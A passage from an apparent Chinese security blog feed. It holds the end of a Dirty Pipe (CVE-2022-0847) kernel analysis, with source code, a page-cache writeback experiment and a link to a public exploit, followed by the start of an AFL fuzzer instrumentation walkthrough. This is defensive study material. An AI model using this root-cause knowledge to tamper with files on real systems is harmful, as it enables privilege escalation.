class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">tatic <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line">        <span class="comment">// 如果要求的offset和实际的offset相同，且头部的buffer指向的就是当前的page cache</span></span><br><span class="line">        <span class="comment">// 则直接移动offset即可</span></span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">    <span class="comment">// 增加page的应用计数</span></span><br><span class="line">get_page(page);</span><br><span class="line">    <span class="comment">// 将pipe缓冲区的page指针指向文件的page cache</span></span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到copy_page_to_iter_pipe函数直接将page cache赋值给对应buffer的page指针，而没有对buffer的flags做初始化存在，使得之前被设置的<code>PIPE_BUF_FLAG_CAN_MERGE</code>仍然有效</p><h1 id="能真正地覆盖文件内容吗"><a href="#能真正地覆盖文件内容吗" class="headerlink" title="能真正地覆盖文件内容吗"></a>能真正地覆盖文件内容吗</h1><p>由上面的漏洞分析可知，最终完成的对page cache的覆写，而不是覆盖磁盘上的文件内容。当文件的page cache存在时，之后读取该文件都将直接从page cache中获取，所以只要该page cache存在，就相当于覆盖了文件内容。经测试，只要重启系统后page cache就会消失，此时再读取文件将会得到原文件内容。</p><p>但是page cache不是有writeback机制吗，只要触发该机制是不是就能将覆写后的page cache写回磁盘呢？</p><p>为了验证这个问题，我调用sync来手动触发writeback</p><p><img src="https://s1.ax1x.com/2022/03/16/qpkMB4.png" alt="image-20220316174559026"></p><p>观察程序输出结果发现，调用sync之后读取文件内容仍然是篡改过后的内容，看起来sync似乎真的把page cache里写回到了磁盘里</p><p><img src="https://s1.ax1x.com/2022/03/16/qpk3NR.png" alt="image-20220316174717827"></p><p>但当我重启系统之后发现文件内容又复原了，说明sync即没有把page cache写回到磁盘，也没有清除缓存中的内容，相当于直接忽略了这个被篡改过的page，这是为什么呢？</p><p>经过调试发现，在向普通文件写入数据时，调用的是generic_file_write_iter函数</p><p><img src="https://s1.ax1x.com/2022/03/16/qpkdDe.png" alt="image-20220316160455049"></p><p>经过如下图所示的调用，最终会调用set_page_dirty函数将该page置为dirty状态，所以最终会被writeback机制写回到磁盘中</p><p><img src="https://s1.ax1x.com/2022/03/16/qpkr4I.png" alt="image-20220316164628152"></p><p>正如源码分析中所说的，向pipe中写入数据时调用的是pipe_write，这时我给set_page_dirty函数设置断点发现，程序之后都没有调用这个函数，这点从源码中也可以证明。</p><p><img src="https://s1.ax1x.com/2022/03/16/qpkgv8.png" alt="image-20220316173149686"></p><p>这说明当我们利用漏洞修改page cache中的内容时，系统并没有将对应的page设置为dirty，所以这个修改对writeback机制来说是不可见的，自然会被忽略掉。</p><p>那为什么重启系统文件内容又会恢复呢？那是因为重启系统将所有的缓存都回收了，执行<code>echo 1 &gt; /proc/sys/vm/drop_caches</code>命令能手动回收缓存，也能将文件内容恢复</p><p><img src="https://s1.ax1x.com/2022/03/16/qpkfbQ.png" alt="image-20220316181600303"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a></p><p><a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">CVE-2022-0847-DirtyPipe-Exploit</a></p><p><a href="https://elixir.bootlin.com/linux/v5.8.1/source">Linux5.8.1源码</a></p><p><a href="https://www.anquanke.com/post/id/269886">CVE-2022-0847 漏洞分析</a></p><p><a href="https://www.codeleading.com/article/63761592269/">VFS源码分析-Page Cache Writeback机制</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;pipe维护了一个&lt;code&gt;struct pipe_buffer&lt;/code&gt;的数组，每个pipe_buffe</summary>
      
    
    
    
    
    <category term="CVE" scheme="http://cyyyber.icu/tags/CVE/"/>
    
    <category term="漏洞分析" scheme="http://cyyyber.icu/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>fuzz一个程序AFL都做了什么</title>
    <link href="http://cyyyber.icu/2022/02/16/fuzz%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8FAFL%E9%83%BD%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <id>http://cyyyber.icu/2022/02/16/fuzz%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8FAFL%E9%83%BD%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</id>
    <published>2022-02-15T16:00:00.000Z</published>
    <updated>2022-02-18T11:49:19.817Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍著名的模糊测试工具AFL在有源码的非QEMU模式下的总体执行流程，忽略一些参数设置、安全检查等细枝末节的操作和一些实现细节。</p><span id="more"></span><h1 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h1><h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><p>测试有源码的程序时，首先要用afl-gcc代替gcc编译程序。其实afl-gcc只是gcc的封装，其内部最终还是调用了gcc，只是在调用时添加了<code>-B</code>的参数指定afl-as为汇编器。所以先是利用gcc的前端将源码编译为汇编语言，再交给afl-as进行汇编操作。</p><h2 id="afl-as"><a href="#afl-as" class="headerlink" title="afl-as"></a>afl-as</h2><p>afl-as也是对GNU的汇编器as的封装，它首先在输入的汇编文件中插桩，然后再调用as翻译为机器语言。</p><p>所谓插桩，就是在程序中的各个位置插入特定的指令，当这段指令被执行就说明程序运行到了这个位置，据此可以判断执行路径并计算代码覆盖率。在afl-as中，64位的“桩”代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>它是一段格式化字符串，<code>%08x</code>就是要被格式化的内容，在实际插入时它将被替换为一个随机数，作为这个桩的标识。所以这段代码首先保存好各个寄存器，将桩标识存入rcx，调用<code>__afl_maybe_log</code>后再恢复寄存器。</p><p>AFL会把桩插在main函数的开头、各个分支的开头和除<code>jmp</code>强制跳转以外所有跳转语句的后面。一个测试程序插桩后再IDA反编译的结果如下</p><p><img src="https://s4.ax1x.com/2022/02/18/H7lMKU.png"></p><p><img src="https://s4.ax1x.com/2022/02/18/H7l8a9.png"></p><p><code>__afl_maybe_log</code>定义在下面的<code>main_payload_64</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8* main_payload_64 = </span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL MAIN PAYLOAD (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.text\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.att_syntax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.code64\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_maybe_log:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))</span></span><br><span class="line">  <span class="string">&quot;  .byte 0x9f /* lahf */\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  lahf\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__OpenBSD__, etc */</span></span></span><br><span class="line">  <span class="string">&quot;  seto  %al\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testq %rdx, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_store:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Calculate and store hit for the code location specified in rcx. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^!COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SKIP_COUNTS</span></span><br><span class="line">  <span class="string">&quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  incb (%rdx, %rcx, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^SKIP_COUNTS */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_return:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  addb $127, %al\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))</span></span><br><span class="line">  <span class="string">&quot;  .byte 0x9e /* sahf */\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  sahf\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__OpenBSD__, etc */</span></span></span><br><span class="line">  <span class="string">&quot;  ret\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 8\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jne __afl_return\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Check out if we have a global pointer on file. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __APPLE__</span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  (%rdx), %rdx\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !^__APPLE__ */</span></span></span><br><span class="line">  <span class="string">&quot;  testq %rdx, %rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_first\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  jmp  __afl_store\n&quot;</span> </span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;__afl_setup_first:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Save everything that is not yet saved and that may be touched by\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     getenv() and several other libcalls we&#x27;ll be relying on. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq -352(%rsp), %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rax,   0(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rcx,   8(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rdi,  16(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %rsi,  32(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r8,   40(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r9,   48(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r10,  56(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %r11,  64(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm0,  96(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm1,  112(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm2,  128(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm3,  144(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm4,  160(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm5,  176(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm6,  192(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm7,  208(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm8,  224(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm9,  240(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm10, 256(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm11, 272(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm12, 288(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm13, 304(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm14, 320(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq %xmm15, 336(%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the\n&quot;</span></span><br><span class="line">  <span class="string">&quot;     original stack ptr in the callee-saved r12. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  pushq %r12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  movq  %rsp, %r12\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  subq  $16, %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;</span></span><br><span class="line">  CALL_L64(<span class="string">&quot;getenv&quot;</span>)</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  testq %rax, %rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  je    __afl_setup_abort\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  